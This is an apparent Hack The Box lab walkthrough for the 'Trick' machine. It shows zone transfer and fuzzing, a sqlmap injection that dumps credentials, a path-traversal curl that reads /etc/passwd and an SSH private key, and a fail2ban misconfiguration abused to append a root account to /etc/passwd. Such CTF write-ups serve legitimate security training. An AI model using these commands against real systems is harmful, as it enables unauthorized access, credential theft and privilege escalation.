---
description: https://app.hackthebox.com/machines/477
cover: ../../../.gitbook/assets/Trick.png
coverY: -52.59067357512954
---

# Trick

## Nmap

```
sudo nmap 10.10.11.166 -p- -sS -sV      

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp open  smtp    Postfix smtpd
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
80/tcp open  http    nginx 1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### DNS

Starting out on DNS we add 10.10.11.166 to our attacking systems secondary DNS servers. Performing a zone transfer with `dig` reveals the sub-domains `root.trick.htb` and `preprod-payroll.trick.htb`.

```
dig AXFR 'trick.htb' @10.10.11.166
```

![](<../../../.gitbook/assets/image (286).png>)

**Note:** Add these into `/etc/hosts.`

Browsing to [http://preprod-payroll.trick.htb](http://preprod-payroll.trick.htb) reveals the following login prompt.

![](<../../../.gitbook/assets/image (2066).png>)

**Note:** add to `/etc/hosts`.

Performing directory enumeration with dirseach reveals the `/user.php` page.

```
dirsearch -u http://preprod-payroll.trick.htb -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt
```

![](<../../../.gitbook/assets/image (2048).png>)

Viewing the page we find the username _Enemigosss._ We find the page buttons are not actionable.

![](<../../../.gitbook/assets/image (2053).png>)

Viewing the page source reveals come code that indicates parameters that we can use.

![](<../../../.gitbook/assets/image (2044).png>)

Testing the page parameter we are taken to a new page however, unable to action in any meaningful way further.

![](<../../../.gitbook/assets/image (2058).png>)

the `id=n` parameter could possibly be susceptible to SQL injection so we fire up `sqlmap` and command in the URL with the parameters.

Running through with the `--batch` and `--tables` parameters we are shown the users table on the payroll\_db database.

```
sqlmap -u 'http://preprod-payroll.trick.htb/manage_user.php?id=1' --batch --tables
```

![](<../../../.gitbook/assets/image (2078).png>)

We can then dump the contents of the users table.

```
sqlmap -u 'http://preprod-payroll.trick.htb/manage_user.php?id=1' --batch -T users --dump 
```

![](<../../../.gitbook/assets/image (2075).png>)

which reveals the following credentias credentials: `Enemigosss:SuperGucciRainbowCake`

Going back to the login page on [http://preprod-payroll.trick.htb](http://preprod-payroll.trick.htb) we are able to proceed with the given credentials.

![](<../../../.gitbook/assets/image (2057).png>)

We find that none of the pages provide any interesting information so we use wfuzz to fuzz for further pages.

```bash
wfuzz -b 'PHPSESSID=j7d96ocnncnp9pajveb9eqlqsg' -u "http://preprod-payroll.trick.htb/index.php?page=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt --hw 504 -c
```

![](<../../../.gitbook/assets/image (2051).png>)

Finding the page [http://preprod-payroll.trick.htb/index.php?page=site\_settings](http://preprod-payroll.trick.htb/index.php?page=site\_settings) we are presented with an opportunity for file upload. However, I was not able to get this working. Viewing the requests through a proxy shows our working user does not have permission for file upload.

![](<../../../.gitbook/assets/image (2059).png>)

Looking again at the subdomain preprod-payroll we can fuzz the subdomain for other potentials domains where the word "payroll" is fuzzed which identifies "marketing".

```
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://trick.htb" -H "Host: preprod-FUZZ.trick.htb" --hl 83 -v
```

![](<../../../.gitbook/assets/image (2065).png>)

Adding `preprod-marketing.trick.htb` to our hosts file we then browse to the domain and find an additional host.

![](<../../../.gitbook/assets/image (2050).png>)

Going through the available pages we find the parameter `/index.php?page=services.htm`l can likely be fuzzed for further pages or maybe even LFI.

![](<../../../.gitbook/assets/image (2070).png>)

Checking for LFI:

```
wfuzz -u "http://preprod-marketing.trick.htb/index.php?page=FUZZ" -w ~/Desktop/lfi_linux.txt --hl 0
```

![](<../../../.gitbook/assets/image (2054).png>)

We get various hits for the bypassing to read `/etc/passwd`.

![](<../../../.gitbook/assets/image (2072).png>)

Seeing that the user michael exists on the target system we fuzz for well known files and get a hit for the `id_rsa` ssh key.

```
curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa'
```

![](<../../../.gitbook/assets/image (2073).png>)

Copying the contents into `id_rsa` and using `chmod` to set the appropriate permissions. We are then able to `SSH` into the target system.

```
sudo chmod 600 id_rsa
```

![](<../../../.gitbook/assets/image (2046).png>)

Grabbing the `user.txt` flag.

![](<../../../.gitbook/assets/image (2064).png>)

Checking sudo permissions with `sudo -l`. We see we have the ability to restart the `fail2ban` service as root without specifying the root password.

![](<../../../.gitbook/assets/image (2045).png>)

Some research into privilege escalation with fail2ban. Having the ability to edit the `iptables-multiport.conf` file presents opportunity for privilege escalation.

{% embed url="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7" %}

The user _michael_ has directory permissions over `/etc/fail2ban/action.d` which means we can replace files within the directory with our own files.

![](<../../../.gitbook/assets/image (2077).png>)

First off, copy the current contents of `iptables-multiport.conf` and make appropriate changes. Below we are setting the command to create a new root user with the password Password123.

```bash
echo 'viper:$1$luDZJMtq$4ljcR6cSb41FraIUQIiQx/:0:0:viper:/home/viper:/bin/bash' >> /etc/passwd
```

The command will be executed under "actionstart" which executes the given command for when the service starts.

![](<../../../.gitbook/assets/image (2082).png>)

The following commands then need executing in quick succession as the directory resets often.

```bash
# Delete current iptables-multiport.conf
echo y | rm iptables-multiport.conf

# create new file
touch iptables-multiport.conf

# open editor
nano iptables-multiport.conf
```

Copy the preconfigured `iptables-multiport.conf` we created earlier into the configuration file and save.

```bash
# Restart fail2ban
sudo -u root /etc/init.d/fail2ban restart
```

Wait a short while, check /etc/password and we should see our new user.

![](<../../../.gitbook/assets/image (2043).png>)

We can then use `su` to switch to our new root user. For some unknown reason during the process of changing user I was moved directly to the root user. No complaints...

![](<../../../.gitbook/assets/image (2071).png>)
